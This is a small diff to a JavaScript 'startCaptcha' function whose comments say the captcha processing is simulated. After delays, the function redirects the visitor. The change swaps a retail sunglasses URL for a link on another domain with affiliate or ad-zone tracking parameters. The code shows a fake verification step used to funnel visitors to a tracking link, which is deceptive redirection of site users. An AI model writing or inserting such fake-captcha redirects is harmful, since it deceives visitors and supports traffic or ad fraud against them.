@@ -22,7 +22,7 @@ function startCaptcha() {
 
         // Redirect to the main site after a delay
         setTimeout(() => {
-            window.location.href = "https://www.lenskart.com/sunglasses/special/vc-aviator.html"; // Redirect URL
+            window.location.href = "https://site.gotoplayojo.com/index.php?aname=sumitreclame_ukppc&zone_id=ukppc"; // Redirect URL
         }, 1500); // 1.5 seconds delay before redirect
     }, 2000); // Simulated processing time (2 seconds)
 }
